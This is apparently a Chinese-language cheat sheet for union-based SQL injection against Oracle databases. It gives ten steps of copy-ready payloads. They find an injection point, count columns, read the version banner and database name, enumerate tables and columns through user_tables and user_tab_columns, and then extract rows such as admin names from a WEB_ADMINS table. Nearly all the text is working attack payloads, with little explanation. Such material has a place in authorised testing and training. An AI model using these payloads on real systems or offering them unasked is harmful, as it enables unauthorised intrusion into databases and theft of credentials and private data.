# oracle

```
1. 找到注入点，类似于下面的
```

' or 1=1-- -

```
2. 判断字段个数类型
```

' or 1=2 order by 4-- - //直到出错 ' or 1=2 union select null,null,null from dual-- - //判断是字符还是整数 如果报错，改为 ' or 1=2 union select 'null','null','null' from dual-- -

```
3. 查库信息
```

' or 1=2 union select null,(select banner from sys.v\_$version where rownum=1),null from dual-- -

```
4. 查库
```

' or 1=2 union select null,(SELECT SYS.DATABASE\_NAME FROM DUAL),null from dual-- -

```
5. 查表
```

' or 1=2 union select null,(select table\_name from user\_tables where rownum=1),null from dual-- -

```
6. 查有无其他表
```

' or 1=2 union select null,(select table\_name from user\_tables where rownum=1 and table\_name not in 'WEB\_ADMINS'),null from dual-- -

```
当有多个需要排除
```

' or 1=2 union select null,(select table\_name from user\_tables where rownum=1 and table\_name not in ('WEB\_ADMINS','WEB\_CONTENT')),null from dual-- -

```
7. 查列
```

' or 1=2 union select null,(select column\_name from user\_tab\_columns where table\_name='WEB\_ADMINS' and rownum=1),null from dual-- -

```
8. 查有无其他列
```

' or 1=2 union select null,(select column\_name from user\_tab\_columns where table\_name='WEB\_ADMINS' and rownum=1 and column\_name not in 'ADMIN\_ID'),null from dual-- - 多个排除同上

```
9. 查列内容
```

' or 1=2 union select null,(select ADMIN\_NAME from "WEB\_ADMINS" where rownum=1),null from dual-- -

```
10.查有无其他内容
```

' or 1=2 union select null,(select ADMIN\_NAME from "WEB\_ADMINS" where rownum=1 and ADMIN\_NAME <> 'admin'),null from dual-- - 其他列的内容同上
